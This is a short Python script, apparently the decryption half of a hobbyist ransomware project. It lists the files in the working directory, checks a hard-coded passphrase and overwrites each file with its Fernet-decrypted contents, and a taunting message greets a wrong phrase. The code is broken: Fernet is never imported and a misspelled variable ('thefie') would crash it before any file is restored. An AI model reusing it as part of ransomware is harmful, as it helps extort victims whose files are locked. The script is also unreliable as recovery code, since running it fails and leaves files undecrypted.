import os

files = []

for file in os.listdir():
  if file == 'main.py' or file == 'key.key' or file == 'decrypt.py':
    continue
  if os.path.isfile(file):
    files.append(file)
print(files)

with open('key.key',"rb") as key:
  secretkey = key.read()

secretphrase = "its_hari"

user_phase = input("Enter the key to decrypt your files :: ")

if user_phase == secretphrase:
  for file in files:
    with open(file,'rb') as thefile:
      contents = thefile.read()
    contents_decrypted = Fernet(secretkey).decrypt(contents)
    with open(file,'wb') as thefile:
      thefie.write(contents_decrypted)
    print("Your files are decrypted..!")
    
else:
  print("Dont play with me.. Enter the correct secret phase..")
